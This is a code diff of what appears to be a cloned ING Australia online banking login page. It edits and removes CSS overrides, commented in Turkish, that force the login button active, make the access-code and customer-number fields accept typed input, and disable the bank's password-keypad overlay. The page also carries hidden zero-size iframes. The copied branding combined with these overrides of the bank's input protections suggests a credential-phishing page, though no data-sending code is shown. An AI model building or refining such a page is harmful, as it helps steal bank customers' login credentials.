@@ -591,15 +591,15 @@
  </div>
  <div class="content-block access-code style-scope ing-keypad">
  
- <div class="password-overlay style-scope ing-keypad" style="pointer-events:none !important; display:none !important;"></div>
- <input id=password type=password tabindex=0 class="form-control input-lg input-empty-password style-scope ing-keypad" placeholder="Access code" style="-webkit-user-select:text !important; user-select:text !important; pointer-events:auto !important;">
+ <div class="password-overlay style-scope ing-keypad" style="display:none !important; pointer-events:none !important;"></div>
+<input id=password type=password tabindex=0 class="form-control input-lg input-empty-password style-scope ing-keypad" placeholder="Access code" style="-webkit-user-select:text !important; user-select:text !important; pointer-events:auto !important; caret-color:auto !important;">
  </div>
  <span class="vh style-scope ing-keypad" id=hiddenSpan tabindex=-1></span>
  </ing-keypad>
  <div class="content-block style-scope ing-login-input">
- <button id=login-btn class="uia-login btn btn-lg btn-blue btn-block style-scope ing-login-input" style="background-color:#E65300 !important; background:#E65300 !important; color:#FFFFFF !important; -webkit-text-fill-color:#FFFFFF !important; opacity:1 !important; filter:none !important; -webkit-filter:none !important; border:1px solid #B64100 !important; box-shadow:0 10px 24px rgba(230,83,0,0.45) !important; pointer-events:auto !important; cursor:pointer !important; visibility:visible !important; font-weight:800 !important;">
-Login
-</button>
+ <button id=login-btn class="uia-login btn btn-lg btn-blue btn-block style-scope ing-login-input">
+ Login
+ </button>
  </div>
  <template is=dom-if class="style-scope ing-login-input"></template>
  <template is=dom-if class="style-scope ing-login-input"></template>
@@ -1237,46 +1237,3 @@ Login
  
  <div class="style-scope iron-a11y-announcer" aria-live=polite></div>
  </iron-a11y-announcer><span class=a11y-announcer aria-live=assertive>Loading complete</span><iframe title=sx_nfk id=idi752 style=visibility:hidden;width:0px;height:0px;border-width:medium;border-style:none;border-color:currentcolor;border-image:initial;display:none></iframe><iframe title=utg_gb id=igdi360 style=visibility:hidden;width:0px;height:0px;border-width:medium;border-style:none;border-color:currentcolor;border-image:initial;display:none></iframe><iframe id=iframe768 title=uyagpv style=width:0px;height:0px;border-width:medium;border-style:none;border-color:currentcolor;border-image:initial;display:none></iframe>
-<style type="text/css" data-au-ing-final-fix="1">
-/* ??? ING AUSTRALIA FINAL FIX — CSS LEVEL EN SON KURAL (body sonu, en son, HEP GECERLI) */
-#login-btn, #login-btn.uia-login, #login-btn.btn, #login-btn.btn-blue, #login-btn.btn-lg,
-#login-btn.btn-block, #login-btn.style-scope, #login-btn[disabled], #login-btn.disabled,
-#login-btn[class*='disabled'], #login-btn[aria-disabled='true']
-{
-  background-color: #E65300 !important;
-  background: #E65300 !important;
-  color: #FFFFFF !important;
-  -webkit-text-fill-color: #FFFFFF !important;
-  -moz-text-fill-color: #FFFFFF !important;
-  opacity: 1 !important;
-  filter: none !important;
-  -webkit-filter: none !important;
-  border-color: #B64100 !important;
-  border: 1px solid #B64100 !important;
-  box-shadow: 0 10px 24px rgba(230, 83, 0, 0.45) !important;
-  pointer-events: auto !important;
-  cursor: pointer !important;
-  visibility: visible !important;
-  display: block !important;
-  font-weight: 800 !important;
-  font-size: 16px !important;
-}
-/* Access code / password input: KLAVYE ILE YAZILABILIR OLSUN */
-#password, #password.form-control, #password.input-lg, #password[tabindex],
-#cifField, #cifField.form-control, #cifField.input-lg, #cifField[type=tel]
-{
-  -webkit-user-select: text !important;
-  user-select: text !important;
-  pointer-events: auto !important;
-  caret-color: auto !important;
-  cursor: text !important;
-  background-color: #FFFFFF !important;
-  color: #2B2E35 !important;
-}
-/* password-overlay: GERIYE KALANLAR ICIN SIFIRLA */
-.password-overlay, .password-overlay.style-scope {
-  display: none !important;
-  pointer-events: none !important;
-  visibility: hidden !important;
-}
-</style>
